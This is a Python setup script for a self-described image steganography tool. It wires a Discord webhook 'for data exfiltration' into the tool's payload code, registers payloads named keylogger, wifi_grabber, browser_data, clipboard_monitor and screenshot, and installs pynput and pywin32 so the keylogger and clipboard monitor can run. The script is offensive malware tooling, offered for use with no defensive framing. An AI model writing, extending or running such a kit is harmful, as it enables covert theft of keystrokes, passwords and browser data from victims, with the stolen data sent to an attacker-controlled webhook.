#!/usr/bin/env python3
"""
Quick Setup Script for Image Steganography Tool
Configures webhook and adds payloads to library
"""

import os
import sys
from pathlib import Path

def print_banner():
    print("=" * 60)
    print("IMAGE Steganography TOOL - QUICK SETUP")
    print("=" * 60)
    print()

def setup_webhook():
    """Configure Discord webhook"""
    print("STEP 1: Discord Webhook Configuration")
    print("-" * 60)
    print("\nTo enable data exfiltration:")
    print("1. Create a Discord server (or use existing)")
    print("2. Go to Server Settings → Integrations → Webhooks")
    print("3. Click 'New Webhook'")
    print("4. Copy the webhook URL")
    print()
    
    webhook_url = input("Enter your Discord webhook URL (or press Enter to skip): ").strip()
    
    if webhook_url:
        # Update webhook_utils.py
        webhook_file = Path("example_payloads/webhook_utils.py")
        
        if webhook_file.exists():
            with open(webhook_file, 'r') as f:
                content = f.read()
            
            # Replace the placeholder
            content = content.replace(
                'WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"',
                f'WEBHOOK_URL = "{webhook_url}"'
            )
            
            with open(webhook_file, 'w') as f:
                f.write(content)
            
            print("\n✓ Webhook configured successfully!")
            
            # Test webhook
            test = input("\nTest webhook now? (y/n): ").lower()
            if test == 'y':
                print("\nTesting webhook...")
                os.system(f"python {webhook_file}")
        else:
            print("\n✗ Error: webhook_utils.py not found")
    else:
        print("\n⊗ Skipped webhook configuration")
    
    print()

def add_payloads():
    """Add example payloads to library"""
    print("\nSTEP 2: Add Payloads to Library")
    print("-" * 60)
    
    payloads = [
        "hello_world.py",
        "system_info.py",
        "network_scan.py",
        "wifi_grabber.py",
        "screenshot.py",
        "file_finder.py",
        "clipboard_monitor.py",
        "keylogger.py",
        "browser_data.py",
        "all_in_one.py"
    ]
    
    add = input(f"\nAdd {len(payloads)} example payloads to library? (y/n): ").lower()
    
    if add == 'y':
        print("\nAdding payloads...")
        
        for payload in payloads:
            payload_path = Path("example_payloads") / payload
            if payload_path.exists():
                cmd = f"python src/main.py payload add {payload_path}"
                result = os.system(cmd)
                if result == 0:
                    print(f"  ✓ {payload}")
                else:
                    print(f"  ✗ {payload} (failed)")
            else:
                print(f"  ⊗ {payload} (not found)")
        
        print("\n✓ Payloads added to library!")
    else:
        print("\n⊗ Skipped payload addition")
    
    print()

def create_test_image():
    """Create a test image"""
    print("\nSTEP 3: Create Test Image")
    print("-" * 60)
    
    create = input("\nCreate test image (800x600 PNG)? (y/n): ").lower()
    
    if create == 'y':
        if Path("create_test_image.py").exists():
            print("\nCreating test image...")
            os.system("python create_test_image.py")
        else:
            print("\n✗ Error: create_test_image.py not found")
    else:
        print("\n⊗ Skipped test image creation")
    
    print()

def install_dependencies():
    """Install optional dependencies"""
    print("\nSTEP 4: Install Optional Dependencies")
    print("-" * 60)
    print("\nSome payloads require additional packages:")
    print("  • pynput - For keylogger.py")
    print("  • pywin32 - For clipboard_monitor.py (Windows)")
    
    install = input("\nInstall optional dependencies? (y/n): ").lower()
    
    if install == 'y':
        print("\nInstalling dependencies...")
        os.system("pip install pynput pywin32")
        print("\n✓ Dependencies installed!")
    else:
        print("\n⊗ Skipped dependency installation")
        print("   You can install later with: pip install pynput pywin32")
    
    print()

def main():
    print_banner()
    
    print("This script will help you set up:")
    print("  1. Discord webhook for data exfiltration")
    print("  2. Example payloads in your library")
    print("  3. Test image for experimentation")
    print("  4. Optional dependencies for advanced payloads")
    print()
    
    proceed = input("Continue with setup? (y/n): ").lower()
    
    if proceed != 'y':
        print("\nSetup cancelled.")
        return
    
    print()
    
    # Run setup steps
    setup_webhook()
    add_payloads()
    create_test_image()
    install_dependencies()
    
    # Final instructions
    print("=" * 60)
    print("SETUP COMPLETE!")
    print("=" * 60)
    print("\nQuick start commands:")
    print()
    print("  # Launch interactive menu")
    print("  python src/main.py")
    print()
    print("  # Quick workflow with test image")
    print("  python src/main.py workflow test_image.png example_payloads/hello_world.py out.png --run")
    print()
    print("  # View help")
    print("  python src/main.py help")
    print()
    print("For full documentation, see README.md")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nSetup interrupted by user.")
    except Exception as e:
        print(f"\n\nError during setup: {e}")
